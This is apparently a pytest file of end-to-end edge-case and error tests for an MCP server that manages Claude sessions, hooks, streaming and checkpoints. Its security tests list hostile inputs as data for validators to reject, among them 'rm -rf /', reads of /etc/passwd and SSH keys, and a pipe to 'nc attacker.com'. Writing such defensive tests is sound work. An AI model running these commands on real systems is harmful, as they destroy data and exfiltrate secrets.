"""
E2E Test Coverage for Edge Cases and Error Scenarios.

This module ensures 100% coverage of edge cases, error paths, and boundary conditions.
"""

import pytest
import asyncio
import os
import signal
from pathlib import Path
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List
from unittest.mock import Mock, patch, AsyncMock
import aiofiles
import json

# Add src to path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from shannon_mcp.utils.errors import (
    ShannonMCPError, SessionNotFoundError, AgentNotFoundError,
    InvalidRequestError, ValidationError, NetworkError,
    StorageError, SecurityError, RateLimitError
)
from shannon_mcp.managers.session import SessionState
from shannon_mcp.managers.binary import BinaryManager
from shannon_mcp.streaming.processor import StreamProcessor
from shannon_mcp.hooks.sandbox import HookSandbox


class TestE2EEdgeCases:
    """Test edge cases and boundary conditions for 100% coverage."""

    # ========== Binary Manager Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_binary_not_found_all_strategies_fail(self):
        """Test when Claude binary cannot be found anywhere."""
        manager = BinaryManager(None)
        
        with patch.dict('os.environ', {'PATH': '/nonexistent'}):
            with patch('shutil.which', return_value=None):
                with patch.object(manager, '_search_nvm_paths', return_value=None):
                    with patch.object(manager, '_search_standard_paths', return_value=None):
                        result = await manager.find_binary()
                        assert result is None

    @pytest.mark.asyncio
    async def test_binary_permission_denied(self, tmp_path):
        """Test binary found but not executable."""
        binary_path = tmp_path / "claude"
        binary_path.write_text("#!/bin/bash\necho 'test'")
        binary_path.chmod(0o000)  # No permissions
        
        manager = BinaryManager(None)
        with patch.dict('os.environ', {'PATH': str(tmp_path)}):
            result = await manager.validate_binary(binary_path)
            assert not result

    @pytest.mark.asyncio
    async def test_binary_version_parsing_errors(self):
        """Test various version string parsing scenarios."""
        manager = BinaryManager(None)
        
        # Invalid version formats
        invalid_versions = [
            "",
            "not a version",
            "v",
            "1.",
            ".2.3",
            "1.2.3.4.5.6",
            "vvv1.2.3"
        ]
        
        for version_str in invalid_versions:
            with patch('subprocess.run') as mock_run:
                mock_run.return_value.stdout = version_str
                version = await manager._get_binary_version(Path("/mock/claude"))
                assert version == "unknown"

    # ========== Session Manager Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_session_state_transitions_invalid(self):
        """Test invalid session state transitions."""
        from shannon_mcp.managers.session import SessionManager
        
        manager = SessionManager(None)
        
        # Invalid transitions
        invalid_transitions = [
            (SessionState.COMPLETED, SessionState.RUNNING),
            (SessionState.FAILED, SessionState.STARTING),
            (SessionState.CANCELLED, SessionState.RUNNING),
            (SessionState.TIMEOUT, SessionState.STARTING)
        ]
        
        for from_state, to_state in invalid_transitions:
            session = Mock(state=from_state)
            with pytest.raises(InvalidRequestError):
                await manager._transition_state(session, to_state)

    @pytest.mark.asyncio
    async def test_session_concurrent_operations(self):
        """Test concurrent operations on same session."""
        from shannon_mcp.managers.session import SessionManager
        
        manager = SessionManager(None)
        session_id = "sess_test123"
        
        # Simulate concurrent cancellation attempts
        cancel_tasks = [
            asyncio.create_task(manager.cancel_session(session_id))
            for _ in range(5)
        ]
        
        with patch.object(manager, '_get_session') as mock_get:
            mock_session = Mock(id=session_id, state=SessionState.RUNNING)
            mock_get.return_value = mock_session
            
            results = await asyncio.gather(*cancel_tasks, return_exceptions=True)
            
            # Only one should succeed, others should fail
            successes = [r for r in results if not isinstance(r, Exception)]
            assert len(successes) == 1

    @pytest.mark.asyncio
    async def test_session_resource_exhaustion(self):
        """Test behavior when system resources are exhausted."""
        from shannon_mcp.managers.session import SessionManager
        
        manager = SessionManager(None)
        
        # Simulate memory exhaustion
        with patch('psutil.virtual_memory') as mock_mem:
            mock_mem.return_value.available = 1024  # Very low memory
            mock_mem.return_value.percent = 99.9
            
            with pytest.raises(SystemError, match="Insufficient memory"):
                await manager.create_session(prompt="Test")

    # ========== Streaming Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_streaming_malformed_jsonl(self):
        """Test handling of malformed JSONL data."""
        processor = StreamProcessor()
        
        malformed_inputs = [
            '{"incomplete": ',
            '}{invalid}',
            'not json at all',
            '{"type": "test"}\n{"broken": ',
            '\x00\x01\x02',  # Binary data
            '{"nested": {"deep": {"too": {"many": {"levels": {}}}}}}'
        ]
        
        for input_data in malformed_inputs:
            result = await processor.process_chunk(input_data)
            assert result.get("error") or result.get("partial")

    @pytest.mark.asyncio
    async def test_streaming_backpressure_limits(self):
        """Test streaming backpressure handling."""
        processor = StreamProcessor(max_buffer_size=1024)
        
        # Generate large amount of data
        large_data = "x" * 2048
        
        # Should handle backpressure
        chunks_processed = 0
        async for chunk in processor.stream_with_backpressure(large_data):
            chunks_processed += 1
            if chunks_processed > 10:
                break  # Prevent infinite loop
        
        assert chunks_processed > 1  # Data was chunked

    @pytest.mark.asyncio
    async def test_streaming_connection_drops(self):
        """Test handling of connection drops during streaming."""
        processor = StreamProcessor()
        
        # Simulate connection drop
        with patch('asyncio.StreamReader.read') as mock_read:
            mock_read.side_effect = ConnectionError("Connection lost")
            
            with pytest.raises(NetworkError):
                async for _ in processor.read_stream():
                    pass

    # ========== Agent System Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_agent_deadlock_prevention(self):
        """Test prevention of agent task deadlocks."""
        from shannon_mcp.managers.agent import AgentManager
        
        manager = AgentManager(None)
        
        # Create circular dependencies
        task1 = Mock(id="task1", dependencies=["task2"])
        task2 = Mock(id="task2", dependencies=["task3"])
        task3 = Mock(id="task3", dependencies=["task1"])
        
        with pytest.raises(ValidationError, match="Circular dependency"):
            await manager.validate_task_dependencies([task1, task2, task3])

    @pytest.mark.asyncio
    async def test_agent_category_exhaustion(self):
        """Test when all agents in a category are busy."""
        from shannon_mcp.managers.agent import AgentManager
        
        manager = AgentManager(None)
        
        # Mark all agents as busy
        with patch.object(manager, 'list_agents') as mock_list:
            mock_list.return_value = []  # No available agents
            
            with pytest.raises(AgentNotFoundError):
                await manager.assign_task(
                    agent_id="any",
                    task="Test task",
                    require_available=True
                )

    # ========== Checkpoint Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_checkpoint_storage_full(self):
        """Test checkpoint creation when storage is full."""
        from shannon_mcp.managers.checkpoint import CheckpointManager
        
        manager = CheckpointManager(None)
        
        with patch('shutil.disk_usage') as mock_disk:
            mock_disk.return_value.free = 1024  # Very low disk space
            
            with pytest.raises(StorageError, match="Insufficient storage"):
                await manager.create_checkpoint(
                    session_id="sess_test",
                    label="test",
                    estimated_size=1024 * 1024  # 1MB
                )

    @pytest.mark.asyncio
    async def test_checkpoint_corruption_recovery(self):
        """Test recovery from corrupted checkpoint data."""
        from shannon_mcp.managers.checkpoint import CheckpointManager
        
        manager = CheckpointManager(None)
        
        # Simulate corrupted checkpoint
        with patch.object(manager, '_load_checkpoint_data') as mock_load:
            mock_load.side_effect = json.JSONDecodeError("Invalid", "", 0)
            
            result = await manager.restore_checkpoint(
                checkpoint_id="ckpt_corrupted",
                allow_partial=True
            )
            
            assert result.partial_restore
            assert "corruption" in result.warnings[0].lower()

    # ========== Hook System Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_hook_infinite_loop_prevention(self):
        """Test prevention of hook infinite loops."""
        from shannon_mcp.managers.hook import HookManager
        
        manager = HookManager(None)
        
        # Create hook that triggers itself
        hook = Mock(
            id="hook1",
            triggers=["custom.event"],
            actions=[{
                "type": "trigger_event",
                "config": {"event": "custom.event"}
            }]
        )
        
        # Should detect and prevent loop
        executions = await manager.execute_hook(hook, max_depth=5)
        assert len(executions) <= 5  # Limited by max_depth

    @pytest.mark.asyncio
    async def test_hook_sandbox_escape_attempts(self):
        """Test sandbox escape prevention."""
        sandbox = HookSandbox()
        
        # Various escape attempts
        malicious_commands = [
            "cd .. && rm -rf /",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "$(cat /etc/passwd)",
            "`whoami`",
            "../../../../../../etc/passwd",
            "python -m http.server 8080"
        ]
        
        for cmd in malicious_commands:
            result = await sandbox.execute_command(cmd)
            assert result["exit_code"] != 0 or result["sandboxed"]

    @pytest.mark.asyncio
    async def test_hook_rate_limit_burst(self):
        """Test hook rate limiting under burst conditions."""
        from shannon_mcp.managers.hook import HookManager
        
        manager = HookManager(None)
        
        hook = Mock(
            id="rate_limited",
            rate_limit=5,  # 5 per minute
            cooldown=10    # 10 seconds between
        )
        
        # Burst of requests
        results = []
        for i in range(10):
            result = await manager.trigger_hook(hook)
            results.append(result)
            
        executed = [r for r in results if r.get("executed")]
        assert len(executed) == 5  # Rate limit enforced

    # ========== Analytics Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_analytics_data_overflow(self):
        """Test analytics with extremely large datasets."""
        from shannon_mcp.analytics.aggregator import MetricsAggregator
        
        aggregator = MetricsAggregator()
        
        # Generate large dataset
        large_metrics = [
            {"timestamp": datetime.now(), "value": i}
            for i in range(1_000_000)
        ]
        
        # Should handle without memory issues
        with patch('resource.getrusage') as mock_resource:
            result = await aggregator.aggregate(
                metrics=large_metrics,
                window_size=3600,
                max_memory_mb=100
            )
            
            assert result.truncated  # Data was truncated
            assert len(result.aggregated) < len(large_metrics)

    @pytest.mark.asyncio
    async def test_analytics_time_skew(self):
        """Test analytics with time skew and out-of-order data."""
        from shannon_mcp.analytics.aggregator import MetricsAggregator
        
        aggregator = MetricsAggregator()
        
        # Data with time skew
        now = datetime.now(timezone.utc)
        metrics = [
            {"timestamp": now + timedelta(hours=2), "value": 1},  # Future
            {"timestamp": now - timedelta(days=400), "value": 2},  # Very old
            {"timestamp": now, "value": 3},  # Current
            {"timestamp": now - timedelta(hours=1), "value": 4},  # Recent past
        ]
        
        result = await aggregator.aggregate(metrics)
        assert len(result.warnings) > 0
        assert "time skew" in result.warnings[0].lower()

    # ========== Process Registry Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_process_zombie_cleanup(self):
        """Test cleanup of zombie processes."""
        from shannon_mcp.managers.process_registry import ProcessRegistryManager
        
        manager = ProcessRegistryManager(None)
        
        # Create zombie process
        with patch('psutil.Process') as mock_process:
            mock_proc = Mock()
            mock_proc.status.return_value = "zombie"
            mock_proc.pid = 12345
            mock_process.return_value = mock_proc
            
            cleaned = await manager.cleanup_zombies()
            assert cleaned > 0

    @pytest.mark.asyncio
    async def test_process_signal_handling(self):
        """Test process signal handling edge cases."""
        from shannon_mcp.managers.process import ProcessManager
        
        manager = ProcessManager()
        
        # Test various signals
        signals_to_test = [
            (signal.SIGTERM, "terminate"),
            (signal.SIGKILL, "kill"),
            (signal.SIGINT, "interrupt"),
            (signal.SIGHUP, "hangup")
        ]
        
        for sig, expected_action in signals_to_test:
            with patch('os.kill') as mock_kill:
                result = await manager.send_signal(12345, sig)
                mock_kill.assert_called_with(12345, sig)

    # ========== Network Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_network_timeout_cascade(self):
        """Test cascading timeouts in network operations."""
        from shannon_mcp.transport.sse import SSETransport
        
        transport = SSETransport()
        
        # Simulate slow network
        with patch('asyncio.wait_for') as mock_wait:
            mock_wait.side_effect = asyncio.TimeoutError()
            
            with pytest.raises(NetworkError):
                await transport.connect(timeout=0.1)

    @pytest.mark.asyncio
    async def test_network_retry_exhaustion(self):
        """Test retry mechanism exhaustion."""
        from shannon_mcp.utils.errors import with_retry
        
        call_count = 0
        
        @with_retry(max_attempts=3, backoff=0.01)
        async def failing_operation():
            nonlocal call_count
            call_count += 1
            raise NetworkError("Connection failed")
        
        with pytest.raises(NetworkError):
            await failing_operation()
        
        assert call_count == 3  # All retries attempted

    # ========== Security Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_security_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        from shannon_mcp.utils.validators import validate_file_path
        
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config",
            "~/../../root/.ssh/id_rsa",
            "\x00/etc/passwd",  # Null byte injection
            "valid/path/../../../../../../etc/passwd"
        ]
        
        for path in dangerous_paths:
            with pytest.raises(SecurityError):
                validate_file_path(path, base_dir="/safe/dir")

    @pytest.mark.asyncio
    async def test_security_command_injection_prevention(self):
        """Test command injection prevention."""
        from shannon_mcp.utils.validators import validate_command
        
        dangerous_commands = [
            "ls; rm -rf /",
            "echo hello && cat /etc/passwd",
            "python -c 'import os; os.system(\"evil\")'",
            "`malicious`",
            "$(evil_command)",
            "test | nc attacker.com 1234",
            "innocent & background_evil &"
        ]
        
        for cmd in dangerous_commands:
            assert not validate_command(cmd, allow_pipes=False)

    # ========== Resource Management Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_resource_cleanup_on_crash(self):
        """Test resource cleanup when server crashes."""
        from shannon_mcp.server_fastmcp import ServerState
        
        state = ServerState()
        await state.initialize()
        
        # Simulate crash
        with patch('sys.exit') as mock_exit:
            # Trigger unhandled exception
            try:
                raise RuntimeError("Simulated crash")
            except:
                await state.emergency_cleanup()
        
        # Verify cleanup occurred
        assert state.cleaned_up
        assert len(state.active_sessions) == 0
        assert state.db_connection is None

    @pytest.mark.asyncio
    async def test_memory_leak_detection(self):
        """Test memory leak detection and prevention."""
        from shannon_mcp.utils.metrics import MemoryMonitor
        
        monitor = MemoryMonitor()
        
        # Simulate memory leak
        leaky_objects = []
        for i in range(1000):
            leaky_objects.append("x" * 1024 * 1024)  # 1MB strings
            
            if i % 100 == 0:
                leak_detected = await monitor.check_for_leaks()
                if leak_detected:
                    break
        
        assert leak_detected
        assert monitor.get_memory_growth_rate() > 0

    # ========== Configuration Edge Cases ==========
    
    @pytest.mark.asyncio
    async def test_config_circular_references(self):
        """Test handling of circular references in config."""
        from shannon_mcp.utils.config import ConfigLoader
        
        loader = ConfigLoader()
        
        circular_config = {
            "a": "${b}",
            "b": "${c}",
            "c": "${a}"
        }
        
        with pytest.raises(ConfigurationError, match="Circular reference"):
            await loader.resolve_variables(circular_config)

    @pytest.mark.asyncio
    async def test_config_missing_required_fields(self):
        """Test missing required configuration fields."""
        from shannon_mcp.utils.config import ShannonConfig
        
        # Missing required fields
        incomplete_configs = [
            {},
            {"database": {}},
            {"logging": {"level": "invalid"}},
            {"binary_manager": {"search_paths": "not_a_list"}}
        ]
        
        for config in incomplete_configs:
            with pytest.raises(ValidationError):
                ShannonConfig(**config)


# Performance edge case tests

class TestE2EPerformanceEdgeCases:
    """Test performance under extreme conditions."""
    
    @pytest.mark.asyncio
    async def test_high_concurrency_sessions(self):
        """Test system under high session concurrency."""
        from shannon_mcp.managers.session import SessionManager
        
        manager = SessionManager(None)
        manager.max_concurrent = 100
        
        # Create many concurrent sessions
        tasks = []
        for i in range(200):  # Exceed limit
            task = asyncio.create_task(
                manager.create_session(prompt=f"Test {i}")
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Some should fail due to limit
        successes = [r for r in results if not isinstance(r, Exception)]
        failures = [r for r in results if isinstance(r, Exception)]
        
        assert len(successes) <= 100
        assert len(failures) > 0

    @pytest.mark.asyncio
    async def test_sustained_high_throughput(self):
        """Test sustained high throughput operations."""
        from shannon_mcp.streaming.processor import StreamProcessor
        
        processor = StreamProcessor()
        
        # Generate high throughput
        message_count = 0
        start_time = asyncio.get_event_loop().time()
        
        while asyncio.get_event_loop().time() - start_time < 5:  # 5 seconds
            await processor.process_message({
                "type": "content",
                "data": "x" * 1024  # 1KB messages
            })
            message_count += 1
        
        throughput = message_count / 5  # Messages per second
        assert throughput > 100  # Should handle >100 msg/sec